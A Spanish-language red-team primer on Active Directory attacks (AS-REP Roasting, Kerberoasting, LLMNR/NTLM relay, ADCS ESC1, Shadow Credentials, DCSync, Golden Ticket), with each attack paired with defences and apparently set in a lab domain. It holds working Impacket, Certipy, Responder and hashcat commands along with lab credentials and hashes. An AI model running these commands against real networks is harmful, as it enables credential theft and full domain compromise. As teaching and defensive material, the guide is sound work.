## AS-REP Roasting
### 💡Explicación del ataque
El ataque **AS‑REP Roasting** explota cuentas de Active Directory que no requieren la preautenticación Kerberos. En Kerberos normalmente un usuario debe probar su identidad antes de obtener un ticket (preautenticación); sin embargo, si la cuenta objetivo tiene la propiedad _“Do not require Kerberos preauthentication”_ activada, cualquiera puede solicitar un Ticket de Autenticación (AS-REP) para esa cuenta sin conocer su contraseña. 

El Active Directory responderá con un mensaje cifrado con la clave derivada de la contraseña del usuario. Este mensaje capturado (el AS-REP) puede ser llevado por el atacante a su propia máquina y **crackeado** offline, revelando potencialmente la contraseña en texto plano de esa cuenta. En resumen, AS‑REP Roasting permite obtener hashes de contraseñas de cuentas que no requieren preautenticación, para luego romper esas contraseñas fuera del entorno de la víctima.

### 🤔 But, why?
Los atacantes usan AS‑REP Roasting porque es un medio relativamente sencillo y discreto de obtener credenciales válidas. No necesitan tener privilegios altos ni explotar vulnerabilidades de software: basta con encontrar una cuenta configurada sin preautenticación Kerberos. El beneficio es considerable ya que, al crackear offline el hash obtenido, el atacante consigue la contraseña en claro de un usuario del dominio, lo que le permite moverse lateralmente o escalar privilegios sin alertar directamente a la víctima (el cracking ocurre fuera de la red objetivo)​. Además, no requiere interacción con la cuenta objetivo (no se bloquea la cuenta ni se generan logs de autenticación fallida en el dominio). Es una táctica destacada incluso por agencias gubernamentales de ciberseguridad, ya que forma parte de las técnicas comunes de comprometer Active Directory.

### 💻 Requerimientos
Para que AS‑REP Roasting sea posible, debe existir al menos una cuenta de usuario en AD con la preautenticación Kerberos no requerida​. Esta configuración **no es habitual** en cuentas normales, pero a veces se encuentra en cuentas de servicio, cuentas antiguas o por mala configuración. El usuario objetivo tiene que estar habilitado en el dominio (no bloqueado ni expirado) y conocer su username. No se requiere ningún acceso previo al dominio (se puede hacer de forma no autenticada enviando solicitudes de Kerberos AS-REQ “a ciegas” para distintos usuarios); sin embargo, si el atacante ya dispone de un listado de usuarios válidos del dominio, le será más fácil identificar qué cuentas tienen deshabilitada la preautenticación​.

### ⚔️ Ataque
Una forma práctica de realizar AS‑REP Roasting es usando la herramienta **GetNPUsers.py** de la suite Impacket:
```bash
GetNPUsers.py <DOMINIO>/ -no-pass -usersfile users.txt
```
Este comando envía solicitudes AS-REQ para cada usuario listado en users.txt sin preautenticación. Si la cuenta no requiere preauth, el KDC devuelve un AS-REP cifrado.

Una vez capturado el hash (formato `$krb5asrep$`), **el atacante procede a crackearlo offline** con una herramienta de fuerza bruta de contraseñas, típicamente Hashcat. Por ejemplo:

```bash
hashcat -m 18200 asrephash.txt /usr/share/wordlists/rockyou.txt
```

### 🛡️Defensa
- No utilice el flag **_DONT_REQ_PREAUTH_**. Si es **muy necesario**, asignar una contraseña muy robusta al usuario con este flag.
- Evitar que existan cuentas con la preautenticación Kerberos deshabilitada.

-------
## Kerberoasting
### 💡Explicación del ataque
Es un ataque dirigido a las cuentas de servicio en Active Directory que poseen un **Service Principal Name (SPN)** registrado. El objetivo es obtener Tickets Granting Services (TGS) que estén asociados a servicios ejecutándose bajo cuentas de usuario del dominio. 

En AD, cuando un usuario solicita acceso a un servicio, obtiene un ticket TGS cifrado con la contraseña (hash) de la cuenta de servicio correspondiente. Kerberoasting aprovecha esta mecánica: un usuario malintencionado, con credenciales de bajo privilegio en el dominio, solicita tickets de todos los servicios configurados (SPNs) y recopila los TGS resultantes​.

Estos tickets llevan parte de sus datos cifrados con la clave derivada de la contraseña del servicio, por lo que si el atacante los obtiene, **puede intentar crackearlos offline** para descubrir la contraseña en texto plano de esas cuentas de servicio.

### 🤔 But, why?

Los atacantes utilizan Kerberoasting porque **ofrece una vía de escalada de privilegios muy efectiva** partiendo de un acceso inicial mínimo. Solo se requiere una cuenta de usuario estándar en el dominio (por ejemplo, una credencial cualquiera obtenida por phishing o similares) para después apuntar a cuentas de servicio, que a menudo tienen privilegios elevados (incluso podrían ser cuentas de administrador de dominio si algún servicio crítico corre con esas credenciales)​.

Donde esta la cruz del asunto?
1. Compañías dejan las mismas contraseñas por años, de manera estática y sin cambiar absolutamente nada.
2. Como el ataque se produce offline, dificulta un poco la detección.
### 💻 Requerimientos
- Un ambiente con cuentas que contengan SPN registrados. (Cuentas de SQL Server, IIS, Exchange, etc)
### ⚔️ Ataque

En la práctica, un atacante con un usuario común del dominio puede ejecutar Impacket **GetUserSPNs.py** para automatizar el Kerberoasting.

```bash
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMINIO>/<USUARIO>:<PASSWORD> -outputfile kerberoasting.hashes
```

Con el archivo generado por esta herramienta, podemos proceder a crackearla:
```bash
hashcat -m 13100 -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt -O
```
### 🛡️Defensa
- Usar contraseñas largas y complejas para cuentas con SPN o es fundamental 
- Aplicar el principio de **privilegio mínimo** a cuentas de servicio: No dar mas permisos de los necesarios.

---
## LLMNR Poisoning y NTLM Relay
### 💡Explicación del ataque
El ataque de **envenenamiento de LLMNR (Link-Local Multicast Name Resolution)** explota un mecanismo de resolución de nombres en redes Windows. Cuando un equipo Windows no logra resolver un nombre de host mediante DNS, por defecto recurre a protocolos de resolución local como LLMNR o NBNS.

Por ejemplo, si un usuario busca el recurso `\\servidor`  su PC emitiría un mensaje LLMNR preguntando por `servidor`. El atacante (ejecutando una herramienta como **Responder**) responde diciendo “Yo soy ese servidor” y el equipo de la víctima, creyéndole, intenta autenticarse contra el atacante.

Esta autenticación suele ser NTLM, lo cual resulta en el atacante recibiendo el hash de la contraseña de la victima.
#### **NTLM Relay**
El atacante puede realizar un ataque de relay NTLM después del poisoning. Esto hace que el usuario utilice las credenciales obtenidas y trate de hacer autenticación en otro servidor o servicio, sin necesidad de conocer la contraseña. A su vez LLMNR/NBNS (Ya están trabajando para remover esta función en su totalidad en versiones futuras de Windows) están habilitados por defecto en Windows por compatibilidad, y muchas organizaciones no los deshabilitan, por lo que el ambiente suele estar configurado para el ataque​.

### 🤔 But, why?
Los atacantes la usan porque **no requiere credenciales ni explotar vulnerabilidades de software**. Usualmente utilizada al inicio de un compromiso (post foothold).
- Pueden ser utilizados en conjunto con el NTLM Relay para realizar autenticacion en otros servicios/servidores/recursos del Active Directory.
- Al igual que en Kerberoasting y AS-REP Roasting pueden ser crackeados de manera offline.

>***📝 Este ataque no solo afecta estos 2 protocolos, si no que puede afectar tambien el MDNS.***

### 💻 Requerimientos
- Protocolos LLMBR / NBTS-NS deben estar activos.
- SMB Signing : False en la maquina. 
### ⚔️ Ataque
#### LLMNR Poisoning
Con Responder:
```bash
sudo responder -I <INTERFAZ>
```

Si se obtiene un hash, podemos tratar de crackear la password offline:
```bash
hashcat -m 5600 responder.hash /usr/share/wordlists/rockyou.txt
```
#### NTLM Relay
Generamos lista de equipos con la opcion de `Signing: False`:
```bash
nxc smb 192.168.56.10-23 --gen-relay-list relay.txt
```

Usamos `ntlmrelayx.py` para reenviar ese request de autenticacion a otro servicio en la red:
```bash
ntlmrelayx.py -tf relay.txt -of netntlm -t NORTH\\EDDARD.STARK@192.168.46.22 -smb2support -socks
```

### 🛡️Defensa
- Deshabilitar LLMNR y NBNS
- Habilitar SMB Signing
- Evitar uso NTLM, use alternativas como Kerberos.
---
## ADCS Exploits

### 💡Explicación del ataque
**Active Directory Certificate Services (AD CS)** puede ser explotado si está mal configurado. En el 2021, el equipo de Specter Ops lanza un whitepaper conteniendo muchas formas de ataques a este servicio de Active Directory. La que se muestra en esta guia es solo 1 de un grupo de familias de ataques. En concreto, ESC1 ocurre cuando una plantilla de certificado de la CA está configurada de tal forma que **cualquier usuario autenticado puede solicitar un certificado para otra identidad** (por ejemplo, hacerse un certificado a nombre del administrador de dominio) sin aprobación administrativa.
### 🤔 But, why?
Brinda ventajas a los atacantes que no se encuentran con otros métodos, específicamente, tienen mucha evasión ya que los atacantes no requieren forzar contraseñas o explotar vulnerabilidades de sistemas operativos. Permiten persistencia ya que incluso si un usuario cambia la contraseña, un certificado anteriormente garantizado, seguirá vigente hasta la fecha de expiración del certificado. La discreción es otro punto importante a tomar en cuenta al momento de utilizar este ataque, muchas veces las organizaciones no tienen alertas configuradas para autenticación con certificados.
### 💻 Requerimientos
- Un certificate template mal configurado en la CA de Active Directory que permita la inscripción (Enroll) a usuarios autenticados sin privilegios.
- La plantilla tiene habilitado _“Enrollee supplies subject”_ = **True** (Esto permite al atacante definir el nombre de la cuenta en el certificado)
- La plantilla incluye el uso extendido de autenticación de cliente. Puede usarse para autenticación en AD.
- No requiere aprobación de un administrador.
### ⚔️ Ataque
Se verifica la existencia de Templates vulnerables utilizado la herramienta [Certipy](https://github.com/ly4k/Certipy):
```bash
certipy find -u cersei.lannister -p 'il0vejaime' -dc-ip 192.168.46.10 -vulnerable -stdout
```

Si se tiene un template vulnerable, se puede solicitar con:
```bash
certipy req -u cersei.lannister -p 'il0vejaime' -target kingslanding.sevenkingdoms.local -template ESC1 -ca SEVENKINGDOMS-CA -upn administrator@sevenkingdoms.local
```

Luego, podemos utilizar este comando para revelar el hash del Administrador:
```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.46.10
```

Con este hash, podemos utilizarlo para logearnos a otros servidores, servicios, y realizar mas pruebas o comprometer incluso mas la red.
### 🛡️Defensa
- Restringir qué usuarios o grupos pueden solicitar certificados a partir de plantillas sensibles.
- Restringir los permisos de inscripción: Asegurar que solo usuarios autorizados o cuentas de servicio puedan solicitar certificados utilizando los permisos de **Enroll** y **AutoEnroll**.
- Habilitar el registro detallado de solicitudes y registros de certificados en la CA, asegurando que todas las operaciones de certificados, incluyendo emisión, renovación y revocación, sean registradas.
- Revisar regularmente los registros para detectar inscripciones sospechosas de certificados.
- Utilizar soluciones **SIEM** como **Splunk** o **Sentinel** para alertar sobre actividad anómala relacionada con certificados.
----
## Shadow Credentials 

Es una técnica de abuso de **permisos ACL(Access Control Lists) en Active Directory** que permite al atacante tomar control de una cuenta sin necesidad de cambiar su contraseña. Ocurre cuando el atacante tiene permisos de escritura (por ejemplo GenericWrite o GenericAll) sobre un objeto de usuario o equipo en AD​. En particular, la técnica apunta al atributo `msDS-KeyCredentialLink` de los objetos AD. Este atributo (introducido en AD 2016 para respaldar funciones como Windows Hello for Business) almacena claves públicas para autenticación mediante claves (certificados) asociadas a la cuenta​
### 💡Explicación del ataque
Este método es muy apreciado por atacantes avanzados porque ofrece **persistencia y sigilo**. Shadow Credentials no alerta al usuario del cambio del objeto en Active Directory. Es una forma de backdoor a nivel de identidad: difícil de detectar si uno no inspecciona atributos AD poco usuales. Si un atacante puede escribir en msDS-KeyCredentialLink de una cuenta, puede insertar una **clave pública propia** (generada por él) para ese usuario. Esto equivale a añadir un nuevo método de autenticación para la víctima
### 🤔 But, why?
Ofrece **persistencia y sigilo**. El atacante puede volver a generar tickets Kerberos para esa cuenta cuando lo necesite, incluso después de desconectarse, siempre y cuando la clave permanezca vinculada en el atributo. Los beneficios para el adversario incluyen: persistencia resistente a reseteo de contraseñas, no interfiere con el uso normal de la cuenta y la actividad de autenticación maliciosa se ve como inicios de sesión validos en Kerberos.
### 💻 Requerimientos
- **Permisos de modificación sobre la cuenta objetivo en AD**. (Generic Write, GenericAll o el mismo atributo de msDS-KeyCredentialLink)
- Windows Server 2016 + (Que introdujo este esquema)
### ⚔️ Ataque
[Certipy](https://github.com/ly4k/Certipy) permite realizar este ataque directamente desde Linux:
```bash
certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p 'cersei' -account 'joffrey.baratheon'
```
Este comando generó silenciosamente un certificado y agregó la clave pública al atributo msDS-KeyCredentialLink de `joffrey.baratheon`.
### 🛡️Defensa 
- Monitoreo constante de ACL en AD (BloodHound funciona perfecto para esto)
- Monitorear directamente cambios en el atributo `msDS-KeyCredentialLink`.
----
## DCSync
### 💡Explicación del ataque
En un ataque DCSync, el atacante abusa de las funciones nativas de replicación de AD: esencialmente se hace pasar por un Domain Controller y solicita al controlador legitimo que le envíe los hashes de contraseñas de las cuentas. Esto se logra usando las llamadas de API al protocolo de replicación (MS-DRSR). Si el usuario tiene los permisos necesarios, el AD responderá con los datos solicitados, en este caso, el NTDS.dit(Base de datos de AD). Este ataque crea muchos logs. Si un atacante logra ejecutar un DCSync, ha comprometido completamente el dominio. 
### 🤔 But, why?
Los atacantes utilizan DCSync porque es **la manera más completa de robar credenciales en AD**. En lugar de tener que ir extrayendo credenciales de distintos equipos, con una sola acción centralizada obtienen todas las cuentas. Este le abre las puertas a movimiento lateral y persistencia.
### 💻 Requerimientos
- Cuenta con permisos de replicación de directorio.
### ⚔️ Ataque
```bash
secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.LOCAL/Administrator@192.168.46.10 -output sevenkingdoms-local.hashes
```
### 🛡️Defensa 
- Monitoreo eventos de replicacion de directorio (Observar eventos 4662)
- Limitar las cuentas con permisos de replicacion.
- Como práctica post-compromiso, si se sospecha que un atacante pudo hacer DCSync, **todas las contraseñas de todos los usuarios deben considerarse comprometidas** y restablecerse, incluyendo cambiar dos veces la contraseña de KRBTGT (para invalidar Golden Tickets)

----
## Golden Ticket
### 💡Explicación del ataque
Un **Golden Ticket** es un tipo de ataque en el que el adversario falsifica un **Ticket-Granting Ticket (TGT) de Kerberos** utilizando la clave secreta del servicio _krbtgt_ del dominio. Si un atacante logra obtener el hash de contraseña (NTLM hash) de la cuenta krbtgt, básicamente posee la “llave maestra” del sistema Kerberos del dominio. Los Golden Tickets típicamente se configuran con largos periodos de vida (por defecto un TGT legítimo dura horas, pero un Golden Ticket puede ser creado con vigencia de 10 años si se desea), lo que permite **persistencia**. 
### 🤔 But, why?
Un atacante recurre al Golden Ticket cuando quiere **mantener acceso al dominio a largo plazo** sin depender de cuentas legítimas ni preocuparse por contraseñas cambiadas. Es la herramienta de persistencia por excelencia tras un compromiso de alto nivel. Otra ventaja es la **dificultad de detección**: dado que el ticket forjado es aceptado por los DCs, las operaciones parecen legítimas.
### 💻 Requerimientos
- El atacante debe haber obtenido el **hash NTLM de la cuenta krbtgt** del dominio.
- El atacante debe conocer el **Domain SID** del dominio objetivo
- Nombre del dominio
- ID de usuario (RID) de la cuenta que va a falsificar.
### ⚔️ Ataque
Con la herramienta ticketer.py del paquete de impacket, podemos utilizar el siguiente comando:
```bash
ticketer.py -nthash c1802a1d08b57644a6a1a2ca0b57fbc6 -domain-sid S-1-5-21-1768168739-1086324585-3153665815 -domain SEVENKINGDOMS.LOCAL ROBERT.BARATHEON
```
Teniendo el ticket, podemos proceder a loggearnos como el usuario `ROBERT.BARATHEON`:
```bash
export KRB5CCNAME=/home/kali/Documents/pt/ROBERT.BARATHEON.ccache
wmiexec.py -k -dc-ip 192.168.46.10 -target-ip 192.168.46.10 -no-pass
```
### 🛡️Defensa 
Este ataque, por su naturaleza, solo se efectúa una vez se tiene todo el dominio comprometido. Por lo tanto, la mayoría de las medidas son de recuperación y detección. 
- Cambiar la contraseña de la cuenta KRBTGT dos veces seguidas.
- Rotar periódicamente KRBTGT, aunque esto puede ser muy complejo.
- Monitoreo de cuenta KRBTGT: esta no debe realizar login interactivo jamás, ni cambiar sus grupos a los que pertenece.